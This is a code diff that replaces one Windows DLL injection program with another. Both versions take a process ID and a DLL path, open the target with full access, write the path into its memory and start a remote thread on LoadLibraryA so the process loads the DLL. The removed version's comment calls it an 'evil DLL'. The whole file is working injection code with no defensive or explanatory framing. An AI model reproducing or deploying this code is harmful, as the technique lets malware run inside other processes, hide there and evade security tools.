@@ -1,51 +1,33 @@
-/*
-*/
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <windows.h>
-#include <tlhelp32.h>
 #include <iostream>
+#include <string>
+#include <windows.h>
 
-int main(int argc, char* argv[]) {
-  HANDLE hProcess; // process handle
-  HANDLE hrThread; // remote thread
-  LPVOID rBuffer; // remote buffer
+using namespace std;
 
-  // handle to kernel32 and pass it to GetProcAddress
-  HMODULE hKernel32 = GetModuleHandle("Kernel32.dll");
-  VOID *fLoadLibA = GetProcAddress(hKernel32, "LoadLibraryA");
+int main(int argc, char *argv[]) {
 
-  // parse process ID
-  if ( atoi(argv[1]) == 0) {
-      printf("PID not found :( exiting...\n");
-      return -1;
-  }
+	
+	DWORD procID = stoi(argv[1]);
+	//cout << "Injecting DLL to PID " << procID << endl;
 
-   // parse process ID
-   if ( strcmp(argv[2],"") == 0) {
-    printf("DLL not found :( exiting...\n");
-    return -1;
-}
-  printf("PID: %i\n", atoi(argv[1]));
-  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	LPCSTR DllPath = argv[2]; // The Path to our DLL
+    //cout << "Starting injection" << endl;
 
-  char *myDLL = argv[2];
-  printf("DLL: %s\n", myDLL);
-  unsigned int myDLLLen = sizeof(myDLL) + 1;
-  printf("LoadLibraryW : 0x%x\n", fLoadLibA);
 
-  // allocate memory buffer for remote process
-  rBuffer = VirtualAllocEx(hProcess, NULL, myDLLLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-  printf("Buffer address : 0x%x\n", rBuffer);
-  printf("Process Handle : 0x%x\n", hProcess);
+    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID); // Opening the Process with All Access
 
-  // "copy" evil DLL between processes
-  WriteProcessMemory(hProcess, rBuffer, myDLL, myDLLLen, NULL);
+	// Allocate memory for the dllpath in the target process, length of the path string + null terminator
+	LPVOID pDllPath = VirtualAllocEx(handle, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
 
-  // our process start new thread
-  hrThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fLoadLibA, rBuffer, 0, NULL);
-  CloseHandle(hProcess);
-  CloseHandle(hrThread);
-  return 0;
+	// Write the path to the address of the memory we just allocated in the target process
+	WriteProcessMemory(handle, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);
+
+	// Create a Remote Thread in the target process which calls LoadLibraryA as our dllpath as an argument -> program loads our dll
+	HANDLE hLoadThread = CreateRemoteThread(handle, 0, 0, 
+	(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
+
+	WaitForSingleObject(hLoadThread, INFINITE); // Wait for the execution of our loader thread to finish
+    CloseHandle(handle);
+
+	return 0;
 }
